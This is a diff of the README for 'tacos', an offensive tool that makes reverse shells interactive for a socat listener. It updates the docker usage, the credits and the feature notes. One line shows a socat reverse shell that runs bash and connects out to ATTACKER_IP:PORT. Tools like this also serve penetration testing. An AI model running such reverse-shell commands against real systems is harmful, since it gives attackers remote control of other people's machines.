@@ -5,6 +5,10 @@
 <img src=https://github.com/ariary/tacos/blob/main/logo.png width=250>
 
 Spawn a pty in your reverse shell to <strong>automaticaly</strong> make it <strong>interactive</strong> for socat listener.
+
+<strong> Fast interactive reverse shell set-up [ 🐳 (container) ](#with-docker-recommended)
+
+<quote><b> All credit goes to <a href=https://github.com/laluka/pty4all>laluka</a> idea </b></quote>
 </div>
 
 
@@ -19,7 +23,8 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 * target doesn't have `socat` and you don't want to do [this](#alternative)
 * provide more advanced configuration to the tty (alias, etc)
 * easier to obfuscate
-* cross-platform (to do) 
+* cross-platform *(windows support is OK but not yet interactive. It is recommended to use non-docker solution for it)*
+* tired of hitting ^C and loosing your shell?
 
 
 ## Usage
@@ -35,16 +40,17 @@ tmux
 # 💥
 ```
 
-### With docker (recoomanded)
+
+### With docker (recommended)
+
 Source aliases *(for simplicity)*:
 ```shell
-alias tacos.container='docker --net host --rm -it tacos'
-alias tacos.windows.container='docker --net host --rm -it tacos-windows'
+alias tacos.container='docker run --net host --rm -it ariary/tacos'
 ```
 
 Launch multi-handler listener:
 ```shell
-tacos.container [LISTENING_ADDR] [LISTENING_PORT]
+tacos.container [LISTENING_ADDR] [LISTENING_PORT] # [OPTIONAL_TACOS_ARS]
 ```
 
 ***Notes about container security:***
